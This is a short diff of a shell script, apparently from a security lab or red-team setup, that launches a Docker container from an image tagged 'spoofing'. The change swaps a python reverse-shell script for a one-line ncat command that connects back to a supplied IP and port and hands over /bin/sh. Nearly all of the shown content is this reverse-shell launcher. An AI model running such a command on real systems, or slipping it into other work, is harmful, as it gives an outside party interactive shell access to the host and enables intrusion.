@@ -5,6 +5,6 @@ connback_port="$2"
 
 hostname="spike"
 imagetag="spoofing:1.0.0"
-cmd="python3 /usr/lib/reverse_shell.py -a $connback_ip -p $connback_port"
+cmd="ncat $connback_ip $connback_port -e /bin/sh"
 
 docker run -h $hostname --rm $imagetag $cmd
